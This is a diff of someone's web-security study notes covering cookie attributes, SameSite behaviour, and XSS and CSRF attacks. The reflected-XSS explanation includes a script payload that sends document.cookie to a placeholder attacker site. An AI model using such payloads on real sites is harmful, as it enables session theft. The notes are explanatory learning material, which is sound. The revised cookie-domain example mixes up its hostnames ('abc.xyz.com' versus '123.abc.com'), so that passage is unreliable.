@@ -192,7 +192,7 @@ the act of taking a website live on a server
 
 <https://zellwk.com/blog/fetch-credentials/>
 
-- Site is domain name. Subdomains are considered to be the same site.
+- Site is defined with scheme and domain name. Different subdomains are also considered to be the same site.
 - Origin is defined with scheme (http or https), domain, and port. Changing any of these values is considered a change in origin.
 
 ## Cookie attributes:
@@ -200,10 +200,11 @@ the act of taking a website live on a server
 <https://prateeksurana.me/blog/javascript-developer-guide-to-browser-cookies/>
 
 - `httpOnly`: prevent browser (client) from reading any cookies with the cookie API. Cookies are accessible only via server. This helps prevent XSS attacks
-- `SameSite`: (<https://andrewlock.net/understanding-samesite-cookies/>) Why we need this attribute: to prevent CSRF. When user send POST request from a malicious website to your original website to something evil, like transfer all your money, Browsers automatically send the cookies for the application when the page does a full form post, and the banking app has no way of knowing that this is a malicious request. 
+- `SameSite`: (<https://andrewlock.net/understanding-samesite-cookies/>) Why we need this attribute: to prevent CSRF. When user send POST request from a malicious website to your original website for something evil, like transfer all your money, browsers automatically send the cookies for the application when the page does a full form post, and the banking app has no way of knowing that this is a malicious request. To access a website, you can type in the domain in URL bar or click on a link
   - `SameSite=Strict`: The cookie will be sent to the server when the current domain in the URL bar equals the cookie's domain (first-party) and the request originates from the same domain as well.
-  - `SameSite=Lax` (default): same as 'strict', Domain in URL bar equals the cookie's domain (first-party), but the link to the request can be from the other sites that point to domain, like you click on the domain on google search result. (GET request also send cookies)
-- `domain`: server tells browser which hosts are allowed to access a cookie server, default to the same host that set the cookie. However, any subdomains of that host won't have the cookie that was set on the main domain. That means 'test.abc.com' cannot access cookies on 'abc.com', the same goes for 'test2.abc.com'. (Note that you still see the cookie from main domain in the browser dev tool, however you won't get access to them). So if your backend is hosted on 'abc.xyz.com' (so the default domain of the cookies will be 'abc.xyz.com') and your client is hosted on another subdomain, like 'def.xyz.com', the cookies are set in response header but they aren't existed on client site and won't be included in the next request to the server. In this case, your cookie's `domain` attribute should be something like '.abc.com' 
+  - `SameSite=Lax` (default): same as 'strict', the current domain in URL bar equals the cookie's domain (first-party), but the link to the request can be from the other sites that point to domain, like you click on the domain on google search result or you submit data from a form embedded on another site to your website using the GET action.
+  - `SameSite=None`: cookies are always sent, regardless of whether you're in a same-site or cross-site scenario. You can do POST, GET requests on another domain to your website and the cookies are sent along
+- `domain`: server tells browser which hosts are allowed to access a cookie server, default to the same host that set the cookie. However, any subdomains of that host won't have the cookie that was set on the main domain. That means 'test.abc.com' cannot access cookies on 'abc.com', the same goes for 'test2.abc.com'. (Note that you still see the cookie from main domain in the browser dev tool, however you won't get access to them). So if your backend is hosted on 'abc.xyz.com' (so the default domain of the cookies will be '123.abc.com') and your client is hosted on another subdomain, like 'def.abc.com', the cookies are set in response header but they aren't existed on client site and won't be included in the next request to the server. In this case, your cookie's `domain` attribute should be something like '.abc.com' 
 - `path`: server tells browser which path are allowed to access and send a cookie to server. A cookie with the path attribute as Path=/store would only be accessible on the path /store and its subpaths /store/cart, /store/gadgets
 - `secure`: A cookie with the Secure attribute is only sent to the server over the secure HTTPS protocol, so the domain of client must be HTTPS. This helps in preventing Man in the Middle attacks by making the cookie inaccessible over unsecured connections
 - Expires: default to `Session`. That means when you close the browser, those cookies will be removed (this is only true if your browser doesn't set On startup as 'Continue where you left off')
@@ -327,7 +328,7 @@ Attacker attempts to inject JavaScript through form inputs, where the attacker p
 
 - Reflected XSS
 
-Attackers inject JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed first to read the cookie on user's website and then user is redirect to attacker site which implement a log system that can extract the cookie data
+Attacker injects JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed first to read the cookie on user's website and then user is redirect to attacker site which implement a log system that can extract the cookie data
 
 As you can see XSS exploit storage (session or local) and cookie that `httpOnly` set to `false`
 
@@ -348,7 +349,7 @@ There are 2 types of CSRF attack
 
 - Through GET request
 
-For example: Attacker send a picture with malicious website URL to user email. This website includes an unwanted request to user bank website, like send attacker money and it is run automatically when the user visit website. Luckily, the user has just logged into bank account which means the cookie is stored in browser. Then he is tricked to visit the malicious website and the unwanted request is made because the cookie is still available.
+For example: The user has just logged into bank account which means the cookie is stored in browser. Attacker send a picture with malicious website URL to user email. This website includes an unwanted request to user bank website, like send attacker money and it is run automatically when the user visit website. Then he is tricked to visit the malicious website and the unwanted request is made because the cookie is still available.
 
 - Through POST request
 
